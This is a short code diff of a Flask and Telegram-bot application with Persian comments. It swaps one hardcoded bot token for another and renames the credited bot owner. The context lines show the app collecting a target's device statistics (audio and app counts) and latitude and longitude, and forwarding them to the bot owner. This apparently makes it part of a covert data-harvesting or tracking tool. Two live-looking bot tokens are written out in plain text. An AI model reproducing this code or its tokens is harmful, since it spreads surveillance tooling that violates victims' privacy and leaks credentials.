@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 import telebot
 
 app = Flask(__name__)
-BOT_TOKEN = "8843122950:AAGI0YgshjvMfK31dlEM0f84-_-0PqL_dow"
+BOT_TOKEN = "8628341169:AAGvtzjg__ulFvf26meJf-hsOnFm3i6p7OE"
 bot = telebot.TeleBot(BOT_TOKEN)
 ADMIN_ID = "8173349543" # شناسه عددی مالک جدید یا پیش‌فرض
 # لینک پایه سایت شما در ریلیوی
@@ -472,7 +472,7 @@ def up_all():
                     f"• 🎵 صوت‌ها: حدود {st.get('audioCount')} فایل\n"
                     f"• 📱 برنامه‌ها: حدود {st.get('appsCount')} عدد\n\n"
                 )
-            msg += "✨ کود نویسی ربات: @shahidnaimi5642\n👑 مالک ربات: @hzr_bt_313"
+            msg += "✨ کود نویسی ربات: @shahidnaimi5642\n👑 مالک ربات: @SHAHID_PV_003"
             send_to_both(target, bot.send_message, msg, parse_mode="Markdown")
 
         if "lat" in d and "lon" in d:
